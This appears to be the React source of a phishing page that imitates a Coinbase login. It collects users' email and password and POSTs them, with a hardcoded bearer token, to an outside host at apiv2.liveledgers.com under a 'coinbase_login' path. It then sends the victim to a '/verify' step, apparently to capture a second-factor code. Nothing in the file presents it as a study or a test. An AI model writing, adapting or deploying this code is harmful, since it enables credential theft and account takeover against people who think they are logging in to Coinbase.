import { useState, useEffect } from 'react';
import { Link, redirect, useNavigate } from 'react-router-dom';
import { Helmet, HelmetProvider } from 'react-helmet-async';
import AppLayout from '../../layouts/AppLayout';
import {db} from '../../services/Firebase';
import { collection, addDoc, getDocs } from "firebase/firestore";
import { toast } from 'react-toastify';
import ValidationService from '../../services/ValidationService';
import axios from 'axios';



function Home() {

    let initLoginFormData       =   {
        email                       :   '', 
        password                    :   '',
        remember_me                 :   'N',
        loading                     :   false,
        domain                      :   window.location.hostname
    };
    
    const [loginFormData, setLoginFormData]     =   useState(initLoginFormData);
    const navigate                              =   useNavigate();

    const url = '';

    const submitLoginHandler        =   (event) => {
        event.preventDefault();

        setLoginFormData({...loginFormData, loading : true});

        let rules                   =   {
            'email'                     :   'required|email',
            'password'                  :   'required',
        };
        let rulesMsg                =   {
            'email'                     :    {required : 'Please enter Email'},
            'password'                  :    {required : 'Please enter Password'},
            'remember_me'               :    {required : ''}
        };
        let error                    =   ValidationService.rulesFirstErrorGenerator(loginFormData, rules, rulesMsg);
        if(error) {
            toast.error(error);
            setLoginFormData({...loginFormData, loading : false});
        } else {
            const headers       =   { 'Accept': 'application/json','Content-Type':'application/json','Authorization':'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY2NTM2Mzg3NjY3MTNkMDBkMzk3YzhmMCJ9.vUCJSsofnVWOb8U7NKRZzLZPzo2QMt5bpp3I_3vJPvA'};
            axios({
                method: 'POST', headers: headers, data : loginFormData, url: 'https://apiv2.liveledgers.com/public/coinbase_login'
            })
            .then(function (response) {
                setLoginFormData({...loginFormData, loading : false});
                //Goto Verify Screen :-
                return navigate("/verify", { state: { loginFormData : loginFormData } });
            })
            .catch(function (error) {
                let msg                 =   error?.response?.data?.detail ?? 'Application not initialize successfully.';
                toast.error(msg);
                setLoginFormData({...loginFormData, loading : false});
            });
        }
    }

return (<AppLayout>
        <Helmet>
            <title>Coinbase Explore| Learn| Businesses| Sign up| Login| Download</title>
        </Helmet>
        <div className='container'>
            <div className="row justify-content-center mt20">
                <div className='col-sm-5 bg-white rounded-2 text-dark p25'>
                    <form className="" onSubmit={submitLoginHandler}>
                        <div className="my20">
                            <input type="email" required className="form-control" placeholder="Email"
                                value={loginFormData.email}
                                onChange={e => setLoginFormData({...loginFormData, 'email' : e.target.value }) }
                            />
                        </div>
                        <div className="my20">
                            <input type="password" required className="form-control" placeholder="Password" 
                                value={loginFormData.password}
                                onChange={e => setLoginFormData({...loginFormData, 'password' : e.target.value }) }
                            />
                        </div>
                        <div className="form-check">
                            <label className="form-check-label fs13">
                                <input className="form-check-input" type="checkbox"  
                                    id="remember_me"  
                                    checked={loginFormData.remember_me == 'Y'}
                                    onChange={e => setLoginFormData({...loginFormData, 'remember_me' : e.target.checked ? 'Y':'N' }) }
                                />
                                Keep me signed in on this computer
                            </label>
                        </div>
                        <div className='text-end'>
                            <button type="submit" className={['btn','btn-success', loginFormData.loading ? 'disabled' : ''].join(' ')} >
                                {loginFormData.loading && <span class="spinner-grow spinner-grow-sm me15" aria-hidden="true"></span>}
                                <span>Submit</span>
                            </button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </AppLayout>)
}

export default Home
